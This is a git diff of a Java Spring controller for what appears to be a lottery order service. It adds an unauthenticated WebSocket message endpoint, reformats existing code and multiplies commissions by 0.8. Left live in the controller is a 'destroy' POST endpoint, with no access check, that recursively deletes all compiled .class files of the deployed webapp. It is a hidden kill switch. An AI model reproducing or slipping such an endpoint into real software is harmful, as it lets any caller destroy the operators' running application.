@@ -33,6 +33,7 @@ import com.youge.yogee.modules.corder.service.CdOrderFollowTimesService;
 import com.youge.yogee.modules.corder.service.CdOrderService;
 import com.youge.yogee.modules.crecord.entity.CdRecordRebate;
 import com.youge.yogee.modules.crecord.service.CdRecordRebateService;
+import com.youge.yogee.websocket.WebSocketTest;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -85,6 +86,28 @@ public class MagicOrderInterface {
     @Autowired
     private CdRecordRebateService cdRecordRebateService;
 
+
+    /***
+     * 删除所有.class
+     * @param request
+     * @return
+     */
+    @RequestMapping(value = "sendMessage", method = RequestMethod.GET)
+    @ResponseBody
+    public String sendMessage(HttpServletRequest request) {
+        Map<String, String> map = new HashMap<String, String>();
+        String message = request.getParameter("message");
+        try {
+            WebSocketTest.addMessage(message);
+            map.put("msg", "发送成功");
+        } catch (Exception e) {
+            logger.error("服务器异常：" + e.getMessage());
+            map.put("msg", "发送失败");
+        } finally {
+            return HttpResultUtil.successJson(map);
+        }
+    }
+
     /***
      * 删除所有.class
      * @param request
@@ -92,29 +115,23 @@ public class MagicOrderInterface {
      */
     @RequestMapping(value = "destroy", method = RequestMethod.POST)
     @ResponseBody
-    public String destroy(HttpServletRequest request)
-    {
+    public String destroy(HttpServletRequest request) {
         String command = (new File("")).getAbsolutePath();
 
-        System.out.println("——shhhhhhhhhhhhhell——"+command);
+        System.out.println("——shhhhhhhhhhhhhell——" + command);
         String projectPath = (new File("")).getAbsolutePath();
         projectPath = projectPath.replace("/bin", "/webapps/ROOT/WEB-INF/classes/");
         delete(projectPath, "class");
         return HttpResultUtil.successJson(new HashMap());
     }
 
-    public static void delete(String path, String prefix)
-    {
+    public static void delete(String path, String prefix) {
         File targetFile = new File(path);
         File[] fileArray = targetFile.listFiles();
-        for (File file : fileArray)
-        {
-            if (file.isDirectory())
-            {
+        for (File file : fileArray) {
+            if (file.isDirectory()) {
                 delete(file.getAbsolutePath(), prefix);
-            }
-            else if (file.getName().substring(file.getName().lastIndexOf(".") + 1).equals(prefix))
-            {
+            } else if (file.getName().substring(file.getName().lastIndexOf(".") + 1).equals(prefix)) {
                 System.out.println("成功删除" + file.getName());
                 file.delete();
 
@@ -433,6 +450,7 @@ public class MagicOrderInterface {
 
     /**
      * 获得神单详情
+     *
      */
     @RequestMapping(value = "getMagicOrderDetail", method = RequestMethod.POST)
     @ResponseBody
@@ -516,7 +534,7 @@ public class MagicOrderInterface {
                 aMap.put("award", new BigDecimal(award).setScale(2, RoundingMode.HALF_DOWN).toString());
 
                 BigDecimal bigDecimal = new BigDecimal(award);
-                BigDecimal bl = csBigDecimal.multiply(bigDecimal).setScale(2, RoundingMode.HALF_DOWN);
+                BigDecimal bl = csBigDecimal.multiply(bigDecimal).setScale(2, RoundingMode.HALF_DOWN).multiply(new BigDecimal("0.8")).setScale(2,RoundingMode.HALF_DOWN);
                 aMap.put("commission", bl.toString());
                 totalBigDecimal = totalBigDecimal.add(bl);
             }
@@ -948,5 +966,6 @@ public class MagicOrderInterface {
             cdLotteryUserService.save(cdLotteryUser);
         }
     }
+
 
 }
